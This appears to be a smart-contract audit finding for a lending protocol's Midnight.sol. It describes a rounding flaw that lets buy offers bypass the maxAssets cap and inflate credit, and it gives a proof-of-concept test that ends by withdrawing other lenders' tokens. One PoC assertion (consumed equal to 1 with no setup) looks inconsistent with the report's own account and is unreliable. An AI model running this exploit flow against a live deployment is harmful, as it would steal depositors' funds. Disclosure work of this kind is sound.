### Title
Buy offer `maxAssets` cap bypass via dust rounding allows unbounded credit creation without asset transfer - (`File: src/Midnight.sol`)

### Summary
When a buy offer has `maxAssets > 0` and `offer.tick < MAX_TICK` (i.e., `buyerPrice < WAD`), taking with `units=1` causes `buyerAssets = mulDivDown(1, buyerPrice, WAD) = 0`. The consumed counter increments by zero, so the cap check `require(newConsumed <= offer.maxAssets)` always passes regardless of how many times the offer is taken. Meanwhile, the buyer's (maker's) credit increases by 1 unit per call with zero loan token transferred.

### Finding Description
**Exact code path** — `src/Midnight.sol` lines 363–369:

```solidity
uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : ...;   // = 0 when units=1, buyerPrice<WAD
uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : ...;  // = 0

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    // += 0, so newConsumed never grows
    require(newConsumed <= offer.maxAssets, ConsumedAssets());  // always passes
}
```

**Root cause**: For a buy offer, the consumed counter tracks `buyerAssets`, not `units`. When `buyerPrice < WAD` (any tick below `MAX_TICK = 5820`) and `units = 1`, `mulDivDown(1, buyerPrice, WAD)` rounds to zero. The cap is never consumed.

**Attacker-controlled inputs**:
- `offer.buy = true`, `offer.maxAssets = 1`, `offer.tick = MAX_TICK - 16` (or any tick < MAX_TICK)
- `units = 1` per call

**Exploit flow via `SetterRatifier`**:
1. Operator (with `isAuthorized[maker][operator] == true`) calls `SetterRatifier.setIsRootRatified(maker, root, true)` where `root` is the hash of the dust offer.
2. Maker authorizes `SetterRatifier` via `midnight.setIsAuthorized(setterRatifier, true, maker)`.
3. Any taker calls `midnight.take(offer, ratifierData, 1, taker, ...)` repeatedly.
4. Each call: `buyerAssets = 0`, `sellerAssets = 0`, `newConsumed` stays at its prior value, cap check passes.
5. Each call: `buyerCreditIncrease = zeroFloorSub(1, buyerPos.debt) = 1` (if no existing debt), so `buyerPos.credit += 1`.
6. Asset transfers: `safeTransferFrom(payer, address(this), 0)` and `safeTransferFrom(payer, receiver, 0)` — zero tokens move.

**Why existing checks fail**: The `ConsumedAssets` check at line 369 is the only cap enforcement. It compares `newConsumed` (which never increases) against `maxAssets`. No minimum-units or minimum-assets floor check exists. The `isRatified` check in `SetterRatifier` only verifies Merkle proof membership and that the root was ratified — it does not validate offer economics.

**Protocol confirmation**: The test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol` lines 858–889 is explicitly named as a bug test and asserts exactly this state: `buyerAssets == 0`, `sellerAssets == 0`, token balances unchanged, yet `creditOf(id, lender) > lenderCreditBefore` and `debtOf(id, borrower) > borrowerDebtBefore`.

### Impact Explanation
The maker's credit (`position[id][buyer].credit`) increases by 1 unit per call with no corresponding loan token deposited into the contract. `totalUnits` also grows. This inflates the credit supply without backing assets, corrupting the invariant that every credit unit has a matching asset in the contract. A maker can accumulate arbitrary credit and later call `withdraw` to drain real loan tokens deposited by other lenders, causing direct loss to those lenders.

### Likelihood Explanation
Preconditions are minimal: any buy offer with `tick < MAX_TICK` (virtually all real offers, since `MAX_TICK` corresponds to price = 1.0 = par) and `maxAssets` set to any nonzero value. The `SetterRatifier` path requires only `isAuthorized[maker][operator]`, which is a standard user-controlled authorization. The attack is repeatable in a loop within a single transaction via `multicall`. No privileged role is needed beyond the maker's own authorization.

### Recommendation
Replace the consumed increment for buy offers from `buyerAssets` to `units` when `maxAssets` is used as a units-denominated cap, **or** add a minimum floor check:

```solidity
require(units > 0 || /* no-op take is intentional */ ..., ZeroUnits());
```

More precisely, enforce that `buyerAssets > 0` whenever `units > 0` for a buy offer with `maxAssets > 0`:

```solidity
if (offer.maxAssets > 0 && offer.buy) {
    require(buyerAssets > 0 || units == 0, DustOffer());
}
```

Alternatively, track consumed in `units` unconditionally (removing the `maxAssets`/`maxUnits` split) and document the semantic clearly.

### Proof of Concept
```solidity
function testDustOfferCreditInflation() public {
    // Setup: buy offer with tick < MAX_TICK so buyerPrice < WAD
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1;          // cap = 1 wei of buyerAssets
    lenderOffer.tick = MAX_TICK - 16;   // tickToPrice < 1e18

    deal(address(loanToken), lender, 0);
    collateralize(market, borrower, 1000);

    uint256 creditBefore = midnight.creditOf(id, lender);
    uint256 balBefore    = loanToken.balanceOf(lender);

    // Repeat 100 times — cap never consumed because buyerAssets=0 each time
    for (uint256 i; i < 100; i++) {
        take(1, borrower, lenderOffer);
    }

    // Assertions
    assertEq(loanToken.balanceOf(lender), balBefore);          // zero tokens moved
    assertEq(midnight.consumed(lender, lenderOffer.group), 1); // cap still at initial value
    assertGt(midnight.creditOf(id, lender), creditBefore + 50); // credit inflated

    // Maker withdraws real tokens deposited by others
    midnight.withdraw(market, midnight.creditOf(id, lender), lender, lender);
    assertGt(loanToken.balanceOf(lender), balBefore); // drained other lenders' funds
}
```

Expected assertions: `consumed` stays at 1, token balance of lender stays at 0 through the loop, credit grows by ~100 units, and the final `withdraw` transfers real tokens to the attacker. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** src/Midnight.sol (L363-369)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** src/Midnight.sol (L455-456)
```text
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```

**File:** src/ratifiers/SetterRatifier.sol (L24-27)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
```
